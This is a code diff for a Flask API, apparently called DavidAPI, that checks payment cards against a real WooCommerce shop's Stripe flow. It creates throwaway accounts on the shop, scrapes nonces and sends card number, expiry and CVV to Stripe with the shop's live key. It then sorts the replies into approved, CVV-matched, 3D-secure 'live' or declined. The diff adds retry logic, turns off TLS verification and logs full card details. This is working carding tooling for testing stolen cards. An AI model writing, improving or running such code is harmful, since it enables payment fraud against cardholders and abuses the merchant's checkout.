@@ -19,7 +19,7 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 
 app = Flask(__name__)
 
-# PROPER CORS Configuration - Add this
+# PROPER CORS Configuration
 CORS(app, resources={
     r"/*": {
         "origins": "*",
@@ -42,7 +42,7 @@ def health():
     return jsonify({'status': 'API is running'})
 
 @app.route('/check', methods=['GET', 'POST', 'OPTIONS'])
-@cross_origin()  # Add this decorator
+@cross_origin()
 def check_card():
     global account_manager
     
@@ -51,7 +51,7 @@ def check_card():
         return jsonify({'status': 'ok'}), 200
     
     try:
-        # Get card data from request - FIXED CONTENT-TYPE HANDLING
+        # Get card data from request
         card_input = ""
         
         if request.method == 'GET':
@@ -78,13 +78,23 @@ def check_card():
         
         cc, mes, ano, cvv = parsed_card
         
-        # Initialize account manager if not exists
+        # Initialize account manager if not exists - WITH RETRY LOGIC
         if not account_manager:
-            account_manager = setup_account_and_nonce()
-            if not account_manager:
-                return jsonify({
-                    'error': 'Failed to initialize payment gateway'
-                }), 500
+            max_retries = 3
+            for attempt in range(max_retries):
+                account_manager = setup_account_and_nonce()
+                if account_manager:
+                    print(f"✅ Account manager initialized successfully on attempt {attempt + 1}")
+                    break
+                else:
+                    print(f"⚠️ Failed to initialize account manager (attempt {attempt + 1})")
+                    if attempt < max_retries - 1:
+                        time.sleep(2)  # Wait before retry
+        
+        if not account_manager:
+            return jsonify({
+                'error': 'Failed to initialize payment gateway after multiple attempts'
+            }), 500
         
         # Process the card
         result = process_card(account_manager, cc, mes, ano, cvv)
@@ -100,15 +110,12 @@ def check_card():
         })
         
     except Exception as e:
+        print(f"❌ Error in check_card: {str(e)}")
         return jsonify({
             'error': f'Internal server error: {str(e)}'
         }), 500
 
-# ===== CORE FUNCTIONALITY ===== 
-# [KEEP ALL YOUR EXISTING CLASSES AND FUNCTIONS EXACTLY AS THEY ARE]
-# AccountManager, NonceExtractor, year_convert, digitt, get_bin_info, 
-# categorize_response, setup_account_and_nonce, parse_card_input, process_card
-# ... [ALL YOUR EXISTING CODE REMAINS UNCHANGED] ...
+# ===== IMPROVED CORE FUNCTIONALITY =====
 
 class AccountManager:
     def __init__(self):
@@ -120,33 +127,47 @@ class AccountManager:
         
     def setup_headers(self):
         self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
         }
         self.session.headers.update(self.headers)
+        self.session.verify = False
     
     def extract_register_nonce(self, html_content):
-        pattern = r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"'
-        match = re.search(pattern, html_content)
-        return match.group(1) if match else None
+        patterns = [
+            r'name="woocommerce-register-nonce" value="([a-f0-9]+)"',
+            r'id="woocommerce-register-nonce" value="([a-f0-9]+)"',
+            r'woocommerce-register-nonce" value="([a-f0-9]+)"'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, html_content)
+            if match:
+                return match.group(1)
+        return None
     
     def extract_wp_referer(self, html_content):
-        pattern = r'name="_wp_http_referer" value="([^"]+)"'
+        pattern = r'name="_wp_http_referer" value="([^"]*)"'
         match = re.search(pattern, html_content)
         return match.group(1) if match else "/my-account/"
     
     def is_logged_in(self, html_content):
         patterns = [
-            r'woocommerce-MyAccount-navigation-link--dashboard',
-            r'woocommerce-MyAccount-navigation-link--orders',
-            r'woocommerce-MyAccount-navigation-link--payment-methods'
+            r'woocommerce-MyAccount-navigation',
+            r'logout',
+            r'my-account/edit-account',
+            r'Dashboard</a>'
         ]
-        return any(re.search(pattern, html_content) for pattern in patterns)
+        return any(re.search(pattern, html_content, re.IGNORECASE) for pattern in patterns)
     
     def register_account(self, email, password):
         try:
+            print(f"🔧 Attempting to register account: {email}")
+            
+            # Step 1: Get the registration page
             response = self.session.get(
                 f"{self.base_url}/my-account/", 
                 timeout=30, 
@@ -154,71 +175,59 @@ class AccountManager:
             )
             response.raise_for_status()
             
+            # Extract nonce and referer
             nonce = self.extract_register_nonce(response.text)
             wp_referer = self.extract_wp_referer(response.text)
             
+            print(f"🔧 Extracted nonce: {nonce}")
+            
             if not nonce:
+                print("❌ No nonce found in registration page")
                 return False
             
+            # Step 2: Register the account
             registration_data = {
                 'email': email,
                 'password': password,
-                'wc_order_attribution_source_type': 'typein',
-                'wc_order_attribution_referrer': '(none)',
-                'wc_order_attribution_utm_campaign': '(none)',
-                'wc_order_attribution_utm_source': '(direct)',
-                'wc_order_attribution_utm_medium': '(none)',
-                'wc_order_attribution_utm_content': '(none)',
-                'wc_order_attribution_utm_id': '(none)',
-                'wc_order_attribution_utm_term': '(none)',
-                'wc_order_attribution_utm_source_platform': '(none)',
-                'wc_order_attribution_utm_creative_format': '(none)',
-                'wc_order_attribution_utm_marketing_tactic': '(none)',
-                'wc_order_attribution_session_entry': 'https://lolaandveranda.com/my-account/',
-                'wc_order_attribution_session_start_time': '2025-10-21 15:16:55',
-                'wc_order_attribution_session_pages': '4',
-                'wc_order_attribution_session_count': '1',
-                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                 'woocommerce-register-nonce': nonce,
                 '_wp_http_referer': wp_referer,
                 'register': 'Register',
             }
             
-            registration_headers = {
-                'authority': 'lolaandveranda.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-                'cache-control': 'max-age=0',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://lolaandveranda.com',
-                'referer': 'https://lolaandveranda.com/my-account/',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-            }
+            # Clean headers for registration
+            reg_headers = self.headers.copy()
+            reg_headers.update({
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': self.base_url,
+                'Referer': f'{self.base_url}/my-account/',
+            })
             
             response = self.session.post(
                 f"{self.base_url}/my-account/",
                 data=registration_data,
-                headers=registration_headers,
+                headers=reg_headers,
                 timeout=30,
                 verify=False,
                 allow_redirects=True
             )
             response.raise_for_status()
             
+            # Check if registration was successful
             if self.is_logged_in(response.text):
+                print(f"✅ Successfully registered and logged in: {email}")
                 self.account_created = True
                 return True
             else:
+                print("❌ Registration failed - not logged in")
+                # Check for error messages
+                if "Error:" in response.text or "invalid_email" in response.text:
+                    error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
+                    if error_match:
+                        print(f"❌ Registration error: {error_match.group(1)}")
                 return False
                 
         except Exception as e:
+            print(f"❌ Registration exception: {str(e)}")
             return False
 
 class NonceExtractor:
@@ -289,13 +298,16 @@ class NonceExtractor:
     
     def get_nonce(self, url="https://lolaandveranda.com/my-account/add-payment-method/"):
         try:
+            print("🔧 Extracting setup intent nonce...")
             response = self.session.get(url, timeout=30, verify=False)
             response.raise_for_status()
             
             nonce = self.extract_nonce_multiple_methods(response.text)
+            print(f"🔧 Extracted setup nonce: {nonce}")
             return nonce
                 
         except Exception as e:
+            print(f"❌ Error extracting nonce: {str(e)}")
             return None
 
 def year_convert(ano):
@@ -321,7 +333,7 @@ def get_bin_info(bin):
     
     headers = {
         'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     }
     
     try:
@@ -348,67 +360,44 @@ def get_bin_info(bin):
 def categorize_response(response_text):
     response = response_text.lower()
     
-    approved_keywords = [
-        "succeeded", "payment-success", "successfully", "thank you for your support",
-        "your card does not support this type of purchase", "thank you",
-        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
-        "thank you for membership", "payment received", "your order has been received",
-        "purchase successful", "approved"
-    ]
+    approved_keywords = ["approved", "succeeded", "successfully"]
+    declined_keywords = ["declined", "invalid", "failed", "error", "incorrect"]
     
-    insufficient_keywords = [
-        "insufficient funds", "insufficient_funds", "payment-successfully"
-    ]
-    
-    auth_keywords = [
-        "mutation_ok_result", "requires_action"
-    ]
-
-    ccn_cvv_keywords = [
-        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
-        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
-        "cvv_check: pass", "security code is invalid", "security code is incorrect",
-        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
-        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
-    ]
-
-    live_keywords = [
-        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
-    ]
-    
-    declined_keywords = [
-        "declined", "invalid", "failed", "error", "incorrect"
-    ]
-
     if any(kw in response for kw in approved_keywords):
-        return "APPROVED", "🔥"
-    elif any(kw in response for kw in ccn_cvv_keywords):
-        return "CCN/CVV", "✅"
-    elif any(kw in response for kw in live_keywords):
-        return "3D LIVE", "✅"
-    elif any(kw in response for kw in insufficient_keywords):
-        return "INSUFFICIENT FUNDS", "💰"
-    elif any(kw in response for kw in auth_keywords):
-        return "STRIPE AUTH", "✅️"
+        return "APPROVED", "✅"
     elif any(kw in response for kw in declined_keywords):
         return "DECLINED", "❌"
     else:
         return "UNKNOWN", "❓"
 
 def setup_account_and_nonce():
-    account_manager = AccountManager()
-    
-    random_id = random.randint(1000, 9999)
-    email = f"david{random_id}@gmail.com"
-    password = f"o0P7u$hm4a2jMet{random_id}"
-    
-    if account_manager.register_account(email, password):
-        nonce_extractor = NonceExtractor(account_manager.session)
-        nonce = nonce_extractor.get_nonce()
+    try:
+        print("🔄 Setting up account manager...")
+        account_manager = AccountManager()
         
-        if nonce:
-            account_manager.nonce = nonce
-            return account_manager
+        # Generate more unique credentials
+        random_id = random.randint(10000, 99999)
+        email = f"user{random_id}@gmail.com"
+        password = f"Pass{random_id}$123"
+        
+        print(f"🔄 Registering account: {email}")
+        
+        if account_manager.register_account(email, password):
+            print("✅ Account registered successfully, extracting nonce...")
+            nonce_extractor = NonceExtractor(account_manager.session)
+            nonce = nonce_extractor.get_nonce()
+            
+            if nonce:
+                account_manager.nonce = nonce
+                print("✅ Account manager setup complete!")
+                return account_manager
+            else:
+                print("❌ Failed to extract setup nonce")
+        else:
+            print("❌ Failed to register account")
+    
+    except Exception as e:
+        print(f"❌ Exception in setup_account_and_nonce: {str(e)}")
     
     return None
 
@@ -438,7 +427,7 @@ def parse_card_input(card_input):
         return None
     
     # Clean and validate
-    cc = cc.strip()
+    cc = cc.strip().replace(" ", "")
     mes = mes.strip()
     ano = ano.strip()
     cvv = cvv.strip()
@@ -451,36 +440,52 @@ def parse_card_input(card_input):
     if len(mes) == 1:
         mes = mes.zfill(2)
     
+    # Basic validation
+    if len(cc) < 15 or len(cc) > 19:
+        return None
+    if len(mes) != 2 or not mes.isdigit():
+        return None
+    if len(ano) != 4 or not ano.isdigit():
+        return None
+    if len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
+        return None
+    
     return cc, mes, ano, cvv
 
 def process_card(account_manager, cc, mes, ano, cvv):
-    ano1 = year_convert(ano)
-    
-    bin_info = get_bin_info(cc[:6])
-    bank = bin_info['bank']
-    country = bin_info['country']
+    print(f"🔧 Processing card: {cc}|{mes}|{ano}|{cvv}")
     
     try:
+        # Get BIN info
+        bin_info = get_bin_info(cc[:6])
+        bank = bin_info['bank']
+        country = bin_info['country']
+        
+        print(f"🔧 BIN Info: {bank} - {country}")
+        
+        # Step 1: Create payment method with Stripe
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
 
-        formatted_card = cc.replace(" ", "+")
+        stripe_data = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mes,
+            'card[exp_year]': ano[-2:],  # Use last 2 digits of year
+            'billing_details[address][postal_code]': '10080',
+            'billing_details[address][country]': 'US',
+            'key': 'pk_live_51KvfxOAXdQYg3Kve5Dflq504Hy68DHhZfeB6eBPir5aY01s18bWHxpVRKRMRYy7kgoKkmCuNgmu7mDiL6WqIVsH7003wq0Cyi3'
+        }
         
-        stripe_data = f'type=card&card[number]={formatted_card}&card[cvc]={cvv}&card[exp_year]={ano1[-2:]}&card[exp_month]={mes}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F4ee0ef76c3%3B+stripe-js-v3%2F4ee0ef76c3%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flolaandveranda.com&time_on_page=55728&client_attribution_metadata[client_session_id]=1d14ad14-50c0-415f-b1cb-05d82bf92a4b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=879faec2-7ed5-4ee1-a1f3-7b10be480c9d&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=6ea35cc5-3766-416d-ba08-434b61fb526d436592&sid=4373bd82-91e4-4fb0-83ee-0ba0f724bcfdddf102&key=pk_live_51KvfxOAXdQYg3Kve5Dflq504Hy68DHhZfeB6eBPir5aY01s18bWHxpVRKRMRYy7kgoKkmCuNgmu7mDiL6WqIVsH7003wq0Cyi3&_stripe_version=2024-06-20'
-        
+        print("🔧 Creating Stripe payment method...")
         response = requests.post(
             'https://api.stripe.com/v1/payment_methods', 
             headers=stripe_headers, 
@@ -489,42 +494,41 @@ def process_card(account_manager, cc, mes, ano, cvv):
             timeout=30
         )
         
+        print(f"🔧 Stripe response status: {response.status_code}")
+        
         if response.status_code != 200:
+            error_msg = f"Stripe API Error: {response.status_code}"
             try:
-                error_json = response.json()
-                if 'error' in error_json:
-                    error_msg = error_json['error'].get('message', 'Unknown error')
-                    return f"Declined: {error_msg}"
+                error_data = response.json()
+                if 'error' in error_data:
+                    error_msg = f"Declined: {error_data['error'].get('message', 'Unknown error')}"
             except:
                 pass
-            return f"API Error: {response.status_code}"
+            return error_msg
         
-        apx = response.json()
+        payment_data = response.json()
         
-        if 'error' in apx:
-            error_msg = apx['error'].get('message', 'Unknown error')
-            return f"Declined: {error_msg}"
+        if 'error' in payment_data:
+            return f"Declined: {payment_data['error'].get('message', 'Unknown error')}"
         
-        payment_method_id = apx.get("id")
+        payment_method_id = payment_data.get("id")
         if not payment_method_id:
             return "Unknown: No payment method ID returned"
         
-        time.sleep(8)
+        print(f"🔧 Payment method created: {payment_method_id}")
         
+        # Wait before next request
+        time.sleep(2)
+        
+        # Step 2: Confirm setup intent
         setup_headers = {
             'authority': 'lolaandveranda.com',
             'accept': '*/*',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://lolaandveranda.com',
             'referer': 'https://lolaandveranda.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
 
@@ -535,6 +539,7 @@ def process_card(account_manager, cc, mes, ano, cvv):
             '_ajax_nonce': account_manager.nonce,
         }
 
+        print("🔧 Confirming setup intent...")
         response = account_manager.session.post(
             'https://lolaandveranda.com/wp-admin/admin-ajax.php', 
             headers=setup_headers, 
@@ -542,6 +547,8 @@ def process_card(account_manager, cc, mes, ano, cvv):
             verify=False,
             timeout=30
         )
+        
+        print(f"🔧 Setup intent response status: {response.status_code}")
         
         if response.status_code == 200:
             result = response.json()
@@ -581,12 +588,22 @@ def process_card(account_manager, cc, mes, ano, cvv):
 account_manager = None
 
 if __name__ == '__main__':
-    # Initialize account manager on startup
-    account_manager = setup_account_and_nonce()
-    if account_manager:
-        print("✅ Account manager initialized successfully")
-    else:
-        print("⚠️ Failed to initialize account manager - will retry on first request")
+    print("🚀 Starting DavidAPI...")
+    
+    # Initialize account manager on startup with retry
+    max_startup_retries = 3
+    for attempt in range(max_startup_retries):
+        account_manager = setup_account_and_nonce()
+        if account_manager:
+            print("✅ Account manager initialized successfully on startup")
+            break
+        else:
+            print(f"⚠️ Failed to initialize account manager on startup (attempt {attempt + 1})")
+            if attempt < max_startup_retries - 1:
+                time.sleep(3)
+    
+    if not account_manager:
+        print("⚠️ Failed to initialize account manager on startup - will retry on first request")
     
     # Get port from environment variable (for Render)
     port = int(os.environ.get('PORT', 10000))
